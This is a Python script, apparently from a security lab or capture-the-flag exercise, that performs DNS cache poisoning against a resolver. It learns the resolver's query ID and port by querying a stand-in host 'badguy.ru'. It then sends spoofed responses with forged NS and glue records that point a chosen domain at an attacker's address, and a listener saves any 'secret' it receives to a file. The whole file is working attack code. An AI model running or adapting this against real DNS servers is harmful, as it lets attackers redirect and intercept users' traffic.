import sys
import threading
from scapy.all import *
from dnslib import *


FOUND           = False

HOST_ADDR       = "badguy.ru"
DEF_ADDR        = "0.0.0.0"
SUFFIX          = "www12345678"

RANGE           = 50
TTL             = 3600
DNS_HOS_PORT    = 55553
LISTENER_PORT   = 1337
DNS_DEF_PORT    = 53
BUFFER_SIZE     = 4096


def parser(dns_addr):
    sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((DEF_ADDR, DNS_HOS_PORT))

    query = DNSRecord(q=DNSQuestion(HOST_ADDR,QTYPE.A))

    sock.sendto(bytes(query.pack()),(dns_addr, DNS_DEF_PORT))
    data, addr = sock.recvfrom(BUFFER_SIZE)
    
    sock.close()

    return DNSRecord.parse(data).header.id, addr[1]

def create_question(domain, dns_addr):
    fake_domain = SUFFIX + "." + domain 
    
    ip  = IP(dst=dns_addr)
    udp = UDP(dport=DNS_DEF_PORT)
    dns = DNS(rd=1, qd=DNSQR(qname=fake_domain))
        
    return bytes(ip / udp / dns)

def create_answers(quid, port, domain, domain_addr, dns_addr, fake_addr):
    fake_domain = SUFFIX + "." + domain 
    packets = []

    start = quid + 1
    end = start + RANGE
    for i in range(start, end):

        ip  = IP(src=domain_addr, dst=dns_addr) 
        udp = UDP(sport=DNS_DEF_PORT, dport=port)
        dns = DNS(id=i, qr=1L,
                qd= DNSQR(qname=fake_domain),
                ns= DNSRR(rrname=domain, type='NS',rdata=fake_domain, ttl=TTL),
                ar= DNSRR(rrname=fake_domain, rdata=fake_addr, ttl=TTL)
        )

        res = (ip / udp / dns)
        packets.append(bytes(res))
    
    return packets

def listener(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((DEF_ADDR, port))
    
    data, addr = sock.recvfrom(BUFFER_SIZE)

    global FOUND
    FOUND = True

    sock.close()

    secret = str(data)
    
    print "*** SECRET FOUND"
    print '\n' + secret + '\n'

    with open("secret.txt", 'w') as f:
        f.write("secret:\n%s\n" % secret)


def poisoner(domain, domain_addr, dns_addr, fake_addr):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

    attempts = 1
    while not FOUND:
        print "*** ATTEMPT", attempts

        quid, port = parser(dns_addr)
        
        question = create_question(domain, dns_addr)
        answers = create_answers(quid, port, domain, domain_addr, dns_addr, fake_addr)

        sock.sendto(question, (dns_addr, 0))
        for a in answers:
            sock.sendto(a, (dns_addr, 0))
        
        attempts += 1

    sock.close()

def usage():
    print "usage:", sys.argv[0], "<dns_addr> <domain> <fake_addr>"
    sys.exit(1)

if __name__ == "__main__":

    if len(sys.argv) != 4:
        usage()

    dns_addr = sys.argv[1]      # argv[1]sock.close()
    domain = sys.argv[2]     # argv[2]
    fake_addr = sys.argv[3]            # argv[3]

    sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((DEF_ADDR, DNS_HOS_PORT))

    query = DNSRecord(q=DNSQuestion(domain,QTYPE.A))

    sock.sendto(bytes(query.pack()),(dns_addr, DNS_DEF_PORT))
    data, addr = sock.recvfrom(BUFFER_SIZE)
    sock.close()

    domain_addr = str(DNSRecord.parse(data).a.rdata)

    listener_t = threading.Thread(target=listener, args=(LISTENER_PORT,))
    listener_t.start()

    poisoner(domain, domain_addr, dns_addr, fake_addr)